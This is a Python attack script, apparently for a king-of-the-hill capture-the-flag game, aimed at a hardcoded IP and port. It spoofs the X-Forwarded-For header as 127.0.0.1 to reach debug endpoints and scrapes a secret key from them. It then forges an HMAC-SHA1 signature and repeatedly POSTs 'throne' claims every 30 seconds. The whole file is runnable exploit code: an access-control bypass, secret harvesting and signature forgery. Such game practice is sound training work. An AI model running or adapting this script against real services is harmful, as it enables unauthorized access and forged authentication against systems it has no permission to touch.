#!/usr/bin/env python3
import hmac, hashlib, time, json, re, sys, urllib.request, urllib.error
HOST = "http://13.37.197.230:28493"
TEAM = "6eefff4072981996"
INTERVAL = 30
KEY_PATHS   = ["/debug", "/api/debug", "/key", "/api/key"]
CLAIM_PATHS = ["/throne", "/claim", "/api/claim", "/king"]

def _get(path):
    req = urllib.request.Request(HOST+path, headers={"X-Forwarded-For":"127.0.0.1"})
    with urllib.request.urlopen(req, timeout=5) as r: return r.status, r.read().decode(errors="replace")

def fetch_key():
    for p in KEY_PATHS:
        try:
            code, txt = _get(p)
            if code==200:
                try:
                    for v in json.loads(txt).values():
                        if isinstance(v,str) and re.fullmatch(r"[0-9a-fA-F]{32,64}", v): return v,p
                except Exception: pass
                m=re.search(r"[0-9a-fA-F]{40,64}", txt)
                if m: return m.group(0),p
        except Exception: pass
    raise RuntimeError("aucune cle via "+str(KEY_PATHS))

def claim(key):
    ts=int(time.time())
    sig=hmac.new(key.encode(), f"{TEAM}|{ts}".encode(), hashlib.sha1).hexdigest()
    body=json.dumps({"team":TEAM,"ts":ts,"sig":sig}).encode()
    for p in CLAIM_PATHS:
        try:
            req=urllib.request.Request(HOST+p, data=body, headers={"Content-Type":"application/json"}, method="POST")
            with urllib.request.urlopen(req, timeout=5) as r:
                return p, r.status, r.read().decode(errors="replace")[:140]
        except urllib.error.HTTPError as e:
            t=e.read().decode(errors="replace")[:140]
            if e.code!=404: return p, e.code, t   # 404 = mauvais chemin, on continue
    return "?", 0, "aucun endpoint claim valide"

hold = "--once" not in sys.argv
n=0
while True:
    n+=1
    try:
        k,kp=fetch_key()
        p,code,txt=claim(k)
        print(f"#{n} key@{kp}={k[:12]}... POST {p} -> {code} {txt}")
    except Exception as e:
        print(f"#{n} erreur: {e}")
    if not hold: break
    time.sleep(INTERVAL)
